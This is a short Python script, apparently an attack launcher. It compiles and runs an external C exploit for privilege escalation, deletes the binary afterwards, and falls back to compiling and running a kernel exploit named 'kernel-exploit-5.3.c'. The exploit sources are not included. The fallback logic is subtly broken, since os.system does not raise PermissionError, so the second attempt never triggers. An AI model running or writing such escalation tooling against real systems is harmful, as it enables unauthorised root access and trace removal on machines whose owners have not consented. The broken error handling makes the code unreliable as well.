import os


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


def attempt_privilege_escalation_one():
    os.system("gcc attempt_one.c -o attempt_one")
    try:
        os.system("./attempt_one;rm attempt_one")
    except PermissionError as error:
        print(error, f"{Colors.red}trying another...{Colors.end}")
        os.system("gcc -Wall -pthread -o kernel-sploit kernel-exploit-5.3.c;./kernel-sploit;rm kernel-sploit")


if __name__ == "__main__":
    attempt_privilege_escalation_one()
